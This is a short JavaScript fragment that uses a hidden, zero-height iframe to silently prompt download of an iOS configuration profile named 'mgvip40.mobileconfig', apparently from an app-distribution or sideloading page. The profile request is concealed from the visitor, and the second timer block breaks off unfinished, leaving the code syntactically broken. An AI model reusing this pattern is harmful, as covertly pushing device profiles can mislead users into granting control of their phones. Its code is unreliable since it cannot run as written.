    function mgvip40() {
        setTimeout(function () {
            var iframe = document.createElement('iframe');
            iframe.style.display = "none";
            iframe.style.height = 0;
            iframe.src = 'mgvip40.mobileconfig';
            document.body.appendChild(iframe);
            setTimeout(function () {
                iframe.remove();
            }, 60 * 1000);
        }, 20);
        setTimeout(function () {
            var iframe = document.createElement('iframe');

    }
